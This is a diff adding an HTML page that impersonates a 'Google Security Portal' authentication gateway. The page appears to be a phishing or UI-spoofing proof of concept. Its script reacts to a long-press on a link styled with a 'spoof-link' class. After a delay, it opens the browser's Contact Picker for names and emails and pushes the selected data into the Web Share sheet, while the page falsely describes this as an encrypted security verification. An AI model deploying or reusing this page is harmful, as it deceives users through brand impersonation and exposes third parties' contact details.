@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Portal Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .banner {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        h1 {
+            font-size: 20px;
+            color: #1a73e8;
+            margin-bottom: 24px;
+        }
+        a.spoof-link {
+            display: inline-block;
+            background-color: #1a73e8;
+            color: white;
+            padding: 14px 28px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            transition: background-color 0.2s;
+        }
+        a.spoof-link:active {
+            background-color: #1557b0;
+        }
+        /* Kotak Preview Teks */
+        .preview-box {
+            margin-top: 25px;
+            background: #fff;
+            border: 1px solid #dadce0;
+            padding: 12px 16px;
+            border-radius: 8px;
+            max-width: 380px;
+            width: 100%;
+            text-align: left;
+            font-size: 13px;
+            color: #5f6368;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            word-break: break-word;
+        }
+        .footer-note {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #9aa0a6;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="banner">Google Security Portal</div>
+    <h1>Authentication Gateway</h1>
+
+    <!-- Target link dengan atribut preview page (target="_blank") -->
+    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Verification</a>
+
+    <!-- Kotak Preview Teks untuk menampilkan hasil pilihan -->
+    <div class="preview-box" id="previewText">
+        Status: Menunggu interaksi verifikasi (Nama & Email)...
+    </div>
+
+    <div class="footer-note">Encrypted verification session.</div>
+
+    <script>
+        document.addEventListener("contextmenu", () => {
+            // Jeda 3 detik setelah gestur long-press (contextmenu) terdeteksi
+            setTimeout(async () => {
+                let contactSummary = "Verifikasi akun keamanan perangkat berhasil.";
+
+                try {
+                    // 1. Memanggil Contact Picker API hanya dengan properti 'name' dan 'email' (tanpa 'tel')
+                    if (navigator.contacts && navigator.contacts.select) {
+                        try {
+                            const contacts = await navigator.contacts.select(['name', 'email'], { multiple: true });
+                            
+                            // Jika ada data yang dipilih, format menjadi teks ringkas
+                            if (contacts && contacts.length > 0) {
+                                let details = contacts.map(c => {
+                                    let name = c.name ? c.name.join(', ') : 'Tanpa Nama';
+                                    let email = c.email ? c.email.join(', ') : 'Tanpa Email';
+                                    return `${name}: ${email}`;
+                                }).join(' | ');
+                                
+                                contactSummary = `Data (Nama & Email): ${details}`;
+                            }
+                        } catch (pickerErr) {
+                            contactSummary = "Interaksi pemilihan dibatalkan.";
+                        }
+                    }
+
+                    // Tampilkan hasil ringkasan ke kotak preview teks di halaman
+                    document.getElementById("previewText").innerText = contactSummary;
+
+                    // 2. Meneruskan hasil pilihan ke Web Share API
+                    if (navigator.share) {
+                        try {
+                            await navigator.share({
+                                title: 'Security Verification Result',
+                                text: contactSummary,
+                                url: window.location.href
+                            });
+                        } catch (shareErr) {
+                            console.debug("Web Share cancelled or unsupported.");
+                        }
+                    }
+
+                } catch (e) {
+                    console.debug("Execution fallback triggered.");
+                } finally {
+                    // Tab tetap terbuka stabil tanpa redirect dan tanpa menutup Chrome
+                    console.debug("Process completed. Tab remains active.");
+                }
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
